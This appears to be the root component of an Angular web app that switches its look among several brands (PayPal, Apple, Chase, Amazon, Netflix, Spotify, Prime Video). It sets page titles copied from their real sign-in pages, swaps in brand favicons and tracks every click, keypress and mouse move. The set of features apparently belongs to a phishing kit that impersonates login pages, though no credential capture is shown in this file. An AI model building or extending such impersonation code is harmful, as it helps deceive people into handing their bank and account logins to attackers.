import { Component, inject, effect, Renderer2, Inject, HostListener } from '@angular/core';
import { Title } from '@angular/platform-browser';
import { TranslateService } from '@ngx-translate/core';
import { DOCUMENT, CommonModule } from '@angular/common';
import { RouterOutlet, RouterLink, RouterLinkActive, ChildrenOutletContexts } from '@angular/router';
import { StateService } from './services/state.service';
import { slideInAnimation, fadeAnimation } from './app/animations';
// Components (Shell)
import { ModalComponent } from './components/modal.component';
import { ToastComponent } from './components/common/toast.component';
import { GlobalSpinnerComponent } from './components/common/global-spinner.component';
import { LanguageConflictComponent } from './components/language-conflict.component';

@Component({
  selector: 'app-root',
  standalone: true,
  imports: [
    CommonModule,
    RouterOutlet,
    ModalComponent,
    ToastComponent,
    GlobalSpinnerComponent,
    LanguageConflictComponent
  ],
  // Animation trigger for route transitions
  animations: [slideInAnimation, fadeAnimation],
  templateUrl: './app.component.html'
})
export class AppComponent {
  state = inject(StateService);
  renderer = inject(Renderer2);
  contexts = inject(ChildrenOutletContexts);
  titleService = inject(Title);
  translate = inject(TranslateService);

  constructor(@Inject(DOCUMENT) private document: Document) {
    // Theme Synchronization Effect
    effect(() => {
      const flow = this.state.currentFlow();
      const body = this.document.body;

      // Reset all theme classes
      this.renderer.removeClass(body, 'theme-paypal');
      this.renderer.removeClass(body, 'theme-netflix');
      this.renderer.removeClass(body, 'theme-apple');
      this.renderer.removeClass(body, 'theme-amazon');
      this.renderer.removeClass(body, 'theme-chase');
      this.renderer.removeClass(body, 'theme-spotify');
      this.renderer.removeClass(body, 'theme-prime-video');

      if (flow) {
        // Update Theme Class
        this.renderer.addClass(body, `theme-${flow.id}`);

        // Update Page Title (Translated)
        const titleKey = `TITLES.${flow.id.toUpperCase()}`; // e.g., TITLES.PAYPAL
        this.translate.stream(titleKey).subscribe((res: string) => {
          // Fallback if key missing (though ideally keys exist)
          if (res === titleKey) {
            // Hardcoded fallbacks if translation missing
            if (flow.id === 'paypal') res = 'Log in to your PayPal account';
            if (flow.id === 'apple') res = 'Sign in - Apple ID';
            if (flow.id === 'netflix') res = 'Netflix';
            if (flow.id === 'chase') res = 'Sign in - Chase.com';
            if (flow.id === 'amazon') res = 'Amazon Sign-In';
            if (flow.id === 'spotify') res = 'Login - Spotify';
            if (flow.id === 'prime-video') res = 'Amazon Sign-In'; // Added missing fallback
          }
          this.titleService.setTitle(res);
        });

        // Update Favicon
        const favicon = this.document.querySelector('link[rel="icon"]') as HTMLLinkElement;
        if (favicon) {
          favicon.href = `assets/favicons/${flow.id}.svg`;
        }
      }
    });
  }

  getRouteAnimationData() {
    return this.contexts.getContext('primary')?.route?.snapshot?.data?.['animation'];
  }

  @HostListener('window:mousemove')
  @HostListener('window:click')
  @HostListener('window:keydown')
  onUserActivity() {
    // Safety check for HMR/Reload states
    if (this.state && this.state.registerUserActivity) {
      this.state.registerUserActivity();
    }
  }
}
